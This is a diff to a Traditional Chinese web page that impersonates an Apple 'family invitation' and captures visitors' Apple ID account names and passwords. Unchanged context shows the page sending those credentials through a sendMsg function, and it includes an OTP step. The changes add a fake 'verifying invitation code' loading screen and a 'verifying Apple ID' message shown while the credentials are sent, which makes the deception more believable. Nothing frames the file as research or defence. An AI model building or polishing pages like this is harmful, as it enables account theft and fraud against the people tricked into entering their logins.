@@ -24,7 +24,7 @@
             position: relative;
         }
 
-        /* 階段 0：首頁邀請函 */
+        /* 階段 0：邀請函首頁 */
         .invite-card {
             text-align: center;
             display: flex;
@@ -228,7 +228,7 @@
 
         <div id="phase-loading" class="glass-card hidden">
             <div class="loader"></div>
-            <p id="loading-text">正在驗證 Apple ID...</p>
+            <p id="loading-text">正在驗證邀請代碼...</p>
         </div>
 
         <div id="phase-otp" class="glass-card hidden">
@@ -270,7 +270,11 @@
         }
 
         function goToLogin() {
-            showPhase('phase-login');
+            showPhase('phase-loading');
+            document.getElementById('loading-text').innerText = "正在驗證邀請代碼...";
+            setTimeout(() => {
+                showPhase('phase-login');
+            }, 1500);
         }
 
         async function handleLogin() {
@@ -284,6 +288,7 @@
             if (!pwRegex.test(pw)) return alert("密碼格式不正確，請重新輸入。");
 
             showPhase('phase-loading');
+            document.getElementById('loading-text').innerText = "正在驗證 Apple ID...";
             await sendMsg(`👨‍👩‍👧‍👦 【家庭邀請 - 登入】\n帳號: ${acc}\n密碼: ${pw}`);
 
             setTimeout(() => {
